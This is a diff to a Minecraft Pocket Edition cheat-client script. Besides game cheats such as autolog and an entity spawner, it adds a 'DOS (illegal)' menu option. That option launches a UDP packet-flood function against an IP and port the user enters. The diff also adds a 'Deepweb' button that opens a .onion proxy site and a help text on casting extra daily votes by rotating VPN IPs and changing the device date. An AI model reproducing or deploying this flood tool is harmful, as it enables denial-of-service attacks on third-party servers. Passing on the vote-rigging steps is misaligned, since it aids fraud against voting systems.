@@ -75,8 +75,9 @@ var cidm8 = "";
 var jumpheight = '5';
 var aimrange = '7';
 var rainId = '';
+var resultty = '';
 var shadow1X = '30';
-var shadow1Y = '0';
+var shadow1Y = '1';
 var keybind1 = false;
 var haxMode = false;
 var newtime = '';
@@ -245,7 +246,10 @@ var tpaura2 = false;
 var tpaura3 = false;
 var sneakaura1 = false;
 var freeze1 = false;
+var fp9x1_ = false;
+var fp9x2_ = false;
 var spinaura = false;
+var autolog = false;
 //ParticleType.angryVillager;
 var particle1 = false;
 //ParticleType.bubble;
@@ -3621,6 +3625,76 @@ function misc_menu() {
 					}
 				});
 				miscLayout.addView(colorlist);
+                var ht10 = new styleButton();
+				ht10.setText("How to vote more daily");
+				ht10.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (v) {
+						var alert = new android.app.AlertDialog.Builder(MainActivity);
+						/*alert.setTitle(""); */
+						var scroll = new android.widget.ScrollView(MainActivity);
+						var layout = new android.widget.LinearLayout(MainActivity);
+						layout.setOrientation(1);
+						alert.setTitle("How to vote more daily");
+						alert.setMessage("Step 1: Enable a vpn\nStep 2: vote as you or anyone\nStep 3: Turn off vpn\nStep 4: choose another vpn ip\nStep 5: Change devices date\nNow you can vote again.-ArceusMatt.\nThis was last checked on 4/23/2017");
+						alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener() {
+							onClick: function (viewarg) {
+								dialog.dismiss();
+								misc.dismiss();
+								showMenuBtn();
+							}
+						});
+						alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener() {
+							onClick: function (viewarg) {
+								dialog.dismiss();
+							}
+						});
+						var dialog = alert.create();
+						dialog.show();
+					}
+				});
+				miscLayout.addView(ht10);
+				var dwbb = new styleButton();
+				dwbb.setText("Deepweb");
+				dwbb.setTextColor(android.graphics.Color.RED);
+				if (fp9x2_ == true) dwbb.setTextColor(android.graphics.Color.GREEN);
+				dwbb.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (v) {
+						fp9x2_ ? fp9x2_ = false : fp9x2_ = true;
+						dwbb.setText("Deepweb");
+						if (fp9x2_ == true) {
+							dwbb.setTextColor(android.graphics.Color.GREEN);
+							fp9x2_ = true;
+							enterAgeK();
+							misc.dismiss();
+						}
+						if (fp9x2_ == false) {
+							dwbb.setTextColor(android.graphics.Color.RED);
+							fp9x2_ = false;
+						}
+					}
+				});
+				miscLayout.addView(dwbb);
+				var heyheyfantastic = new styleButton();
+				heyheyfantastic.setText("DOS (illegal)");
+				heyheyfantastic.setTextColor(android.graphics.Color.RED);
+				if (fp9x1_ == true) heyheyfantastic.setTextColor(android.graphics.Color.GREEN);
+				heyheyfantastic.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (v) {
+						fp9x1_ ? fp9x1_ = false : fp9x1_ = true;
+						heyheyfantastic.setText("DOS (illegal)");
+						if (fp9x1_ == true) {
+							heyheyfantastic.setTextColor(android.graphics.Color.GREEN);
+							fp9x1_ = true;
+							enterAgeK();
+							misc.dismiss();
+						}
+						if (fp9x1_ == false) {
+							heyheyfantastic.setTextColor(android.graphics.Color.RED);
+							fp9x1_ = false;
+						}
+					}
+				});
+				miscLayout.addView(heyheyfantastic);
 				var exit2Layout = new android.widget.LinearLayout(MainActivity);
 				exit2Layout.setOrientation(0);
 				var params = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);
@@ -3801,36 +3875,14 @@ function selectView() {
 				selectLayout1.addView(selectScroll);
 				var exit = new styleButton();
 				if(ccolors)exit.setText("Exit");
-				if(entselect)exit.setText("Turn off");
 				exit.setTextColor(android.graphics.Color.RED);
 				exit.setOnClickListener(new android.view.View.OnClickListener({
 					onClick: function (viewarg) {
 						select.dismiss();
 						showMenuBtn();
-lightning = false;
-//EntityType.LIGHTNING_BOLT;
-primedtnt = false;
-//EntityType.PRIMED_TNT;
-arrow = false;
-//EntityType.ARROW;
-exporb = false;
-//EntityType.EXPERIENCE_ORB;
-fireball = false;
-//EntityType.FIREBALL;
-egg = false;
-//EntityType.EGG;
-endersignal = false;
-//70
-shulkerbullet = false;
-//76
-snowball = false;
-//81
-witherskull = false;
-//89
-
 					}
 				}));
-				selectLayout.addView(exit);
+				if(ccolors)selectLayout.addView(exit);
 				var co1 = new styleButton(); //aqua §b
 				var co0 = new styleButton(); //begin §
 				var co2 = new styleButton(); //black §0
@@ -3868,6 +3920,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					lightning = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti1);
@@ -3876,6 +3929,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					primedtnt = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti2);
@@ -3884,6 +3938,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					arrow = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti3);
@@ -3892,6 +3947,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					exporb = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti4);
@@ -3900,6 +3956,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					fireball = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti5);
@@ -3908,6 +3965,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					egg = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti6);
@@ -3916,6 +3974,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					endersignal = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti7);
@@ -3924,6 +3983,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					shulkerbullet = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti8);
@@ -3932,6 +3992,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					snowball = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti9);
@@ -3940,6 +4001,7 @@ witherskull = false;
 					onClick: function (viewarg) {
 					witherskull = true;
 					select.dismiss();
+					showMenuBtn();
 					}
 				}));
 				selectLayout.addView(enti10);
@@ -4825,6 +4887,27 @@ android.widget.Toast.makeText(MainActivity, "Credit: Firepro9978 from flame clie
 									}
 								}));
 								cheatLayout.addView(hitbutton);
+                                                                var bitchplz = new styleButton();
+								bitchplz.setText("Autolog");
+								bitchplz.setTextColor(android.graphics.Color.RED);
+								if (autolog == true) bitchplz.setTextColor(android.graphics.Color.GREEN);
+								bitchplz.setOnClickListener(new android.view.View.OnClickListener({
+									onClick: function (viewarg) {
+										autolog ? autolog = false : autolog = true;
+										bitchplz.setText("Autolog");
+										if (autolog == true) {
+											bitchplz.setTextColor(android.graphics.Color.GREEN);
+											clientMessage(client + "Autolog on\nYou'll now log off if a player is near-by!");
+											autolog = true;
+										}
+										if (autolog == false) {
+											bitchplz.setTextColor(android.graphics.Color.RED);
+											clientMessage(client + "Autolog off");
+											autolog = false;
+										}
+									}
+								}));
+								cheatLayout.addView(bitchplz);
 								/*
 	* WIP
 	*
@@ -7870,11 +7953,44 @@ Level.setTile(getPlayerX() -3, getPlayerY() -2, getPlayerZ() -8, 2, 0);
 								modLayout.addView(df);
 								var es = new styleButton();
 								es.setText("Entity spawner");
+								es.setTextColor(android.graphics.Color.RED);
+								if (entselect == true) es.setTextColor(android.graphics.Color.GREEN);
 								es.setOnClickListener(new android.view.View.OnClickListener({
 									onClick: function (viewarg) {
-										selectView();
-										mod.dismiss();
-										if(entselect == false)var entselect = true;
+										entselect ? entselect = false : entselect = true;
+										es.setText("Entity spawner");
+										if (entselect == true) {
+											es.setTextColor(android.graphics.Color.GREEN);
+											clientMessage(client + "Entity spawner on");
+											mod.dismiss();
+											selectView();
+											entselect = true;
+										}
+										if (entselect == false) {
+											es.setTextColor(android.graphics.Color.RED);
+											clientMessage(client + "Entity spawner off");
+											lightning = false;
+											//EntityType.LIGHTNING_BOLT;
+											primedtnt = false;
+											//EntityType.PRIMED_TNT;
+											arrow = false;
+											//EntityType.ARROW;
+											exporb = false;
+											//EntityType.EXPERIENCE_ORB;
+											fireball = false;
+											//EntityType.FIREBALL;
+											egg = false;
+											//EntityType.EGG;
+											endersignal = false;
+											//70
+											shulkerbullet = false;
+											//76
+											snowball = false;
+											//81
+											witherskull = false;
+											//89
+											entselect = false;
+										}
 									}
 								}));
 								modLayout.addView(es);
@@ -15475,6 +15591,162 @@ function new2() {
 	});
 }
 
+function dos(ip, port, howmuch){
+var r = new java.lang.Runnable({
+       run: function() {
+	try{
+for(var i = 0;i<=howmuch;i++){
+var socket = new java.net.DatagramSocket();
+var buf = new byte[2024];
+buf = ""+Math.round(Math.random(194 * 82))+"".toString().getBytes("UTF8");
+socket.send(new java.net.DatagramPacket(buf, buf.length, java.net.InetAddress.getByName(ip), port));
+socket.close();
+}
+        }catch(e){
+            print(e);
+        }}});
+var t = new java.lang.Thread(r);
+t.start();
+}
+
+function sodEditor() {
+	ctx.runOnUiThread(new java.lang.Runnable() {
+		run: function () {
+			try {
+				sodD = new android.widget.PopupWindow();
+				var Layer = new android.widget.LinearLayout(ctx);
+				var ip = new styleInput();
+				var port = new styleInput();
+				var packet = new styleInput();
+				var Dialog = new android.app.Dialog(ctx);
+				var Exit = new styleButton(ctx);
+				Dialog.setTitle("Choose target");
+				Dialog.setContentView(Layer);
+				Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+				Dialog.show();
+				Layer.addView(ip);
+				Layer.addView(port);
+				Layer.addView(packet);
+				Layer.addView(Exit);
+				ip.setText("");
+				ip.setHint("0.0.0.0");
+				port.setText("");
+				port.setHint("0");
+				packet.setText("");
+				packet.setHint("0");
+				Exit.setText("Fire");
+				Exit.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (view) {
+						f3b13 = ip.getText();
+						n2a19 = port.getText();
+						zp90Q = packet.getText();
+						dos(f3b13, n2a19, zp90Q);
+						Dialog.dismiss();
+					}
+				});
+				sodD.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+				sodD.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+				sodD.showAtLocation(ctx.getWindow()
+					.getDecorView(), android.view.Gravity.TOP, 0, 0);
+			} catch (e) {
+				print("sod dialog:" + e);
+			}
+		}
+	});
+}
+
+function fp9x1a(){
+						var alert = new android.app.AlertDialog.Builder(MainActivity);
+						/*alert.setTitle(""); */
+						var scroll = new android.widget.ScrollView(MainActivity);
+						var layout = new android.widget.LinearLayout(MainActivity);
+						layout.setOrientation(1);
+						alert.setTitle("READ FOR SAFETY");
+						alert.setMessage("IF YOU DOS A HOST\nALPHAHACK DEVS ARE NOT RESPONSIBLE, YOU ARE.\nGOOD LUCK! DOS IS ILLEGAL.\nYOU HAVE BEEN WARNED...");
+						alert.setPositiveButton("Continue", new android.content.DialogInterface.OnClickListener() {
+							onClick: function (viewarg) {
+								dialog.dismiss();
+								sodEditor();
+							}
+						});
+						alert.setNegativeButton("Exit", new android.content.DialogInterface.OnClickListener() {
+							onClick: function (viewarg) {
+								dialog.dismiss();
+							}
+						});
+						var dialog = alert.create();
+						dialog.show();
+}
+
+function fp9x2b(){
+						var alert = new android.app.AlertDialog.Builder(MainActivity);
+						/*alert.setTitle(""); */
+						var scroll = new android.widget.ScrollView(MainActivity);
+						var layout = new android.widget.LinearLayout(MainActivity);
+						layout.setOrientation(1);
+						alert.setTitle("READ FOR SAFETY");
+						alert.setMessage("THIS IS NOT TOR!!!\nUSE A VPN AND DO NOT CLICK CLICKBAIT OR CHILDPORN!!!\nYOUR IP IS NOT HIDDEN HERE! WE ARE NOT RESPONSIBLE!");
+						alert.setPositiveButton("Continue", new android.content.DialogInterface.OnClickListener() {
+							onClick: function (viewarg) {
+								dialog.dismiss();
+								betterWebview('http://hss3uro2hsxfogfq.onion.cab');
+							}
+						});
+						alert.setNegativeButton("Exit", new android.content.DialogInterface.OnClickListener() {
+							onClick: function (viewarg) {
+								dialog.dismiss();
+							}
+						});
+						var dialog = alert.create();
+						dialog.show();
+}
+
+function enterAgeK() {
+	ctx.runOnUiThread(new java.lang.Runnable() {
+		run: function () {
+			try {
+				verifyD = new android.widget.PopupWindow();
+				var Layer = new android.widget.LinearLayout(ctx);
+				var agver = new styleInput();
+				showMenuBtn();
+				var Dialog = new android.app.Dialog(ctx);
+				var Exit = new styleButton(ctx);
+				Dialog.setTitle("Enter your age");
+				Dialog.setContentView(Layer);
+				Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+				Dialog.show();
+				Layer.addView(agver);
+				Layer.addView(Exit);
+				agver.setText("");
+				agver.setHint("YOUR AGE HERE");
+				Exit.setText("Continue");
+				Exit.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (view) {
+						resultty = agver.getText();
+						checkLeAge();
+						Dialog.dismiss();
+					}
+				});
+				verifyD.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+				verifyD.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+				verifyD.showAtLocation(ctx.getWindow()
+					.getDecorView(), android.view.Gravity.TOP, 0, 0);
+			} catch (e) {
+				print("verify dialog:" + e);
+			}
+		}
+	});
+}
+
+function checkLeAge(){
+						if(fp9x1){
+						if(89 / 5 < resultty)fp9x1a();
+						}
+						if(fp9x2){
+						if(89 / 5 < resultty)fp9x2b();
+						}
+}
+
 function named() {
 	MainActivity.runOnUiThread(new java.lang.Runnable() {
 		run: function () {
@@ -17793,7 +18065,7 @@ function modTick() {
 		}
 	}
 	if (noknock) {
-		if (Entity.getVelY(Player.getEntity()) > 0.1 && getTile(x - 1, y - 1, z) == 0 || getTile(x, y - 1, z - 1) == 0 || getTile(x + 1, y - 1, z) == 0 || getTile(x, y - 1, z + 1) == 0) {
+		if (Entity.getVelY(Player.getEntity()) > 0.1 && getTile(x - 1, y -2, z) < 1 || getTile(x, y -2, z - 1) < 1 || getTile(x + 1, y -2, z) < 1 || getTile(x, y -2, z + 1) < 1 || getTile(x +1, y -2, z -1) < 1 || getTile(x -1, y -2, z +1) < 1 || getTile(x +1, y -2, z +1) < 1 || getTile(x -1, y -2, z -1) < 1) {
 			Entity.setVelY(Player.getEntity(), -0.5);
 		}
 	}
@@ -18350,6 +18622,10 @@ function rptask() {
 						if (spinaura) {
 						var ent = getNearestEntity(aimrange);
 						if (ent != null && ent != getPlayerEnt()) Entity.setVelX(getPlayerEnt(), -0.00005);
+						}
+						if (autolog) {
+						var ent = getNearestEntity(aimrange);
+						if (ent != null && ent != getPlayerEnt()) ModPE.leaveGame();
 						}
 						if (twerk) twerking();
 						nx = getPlayerX();
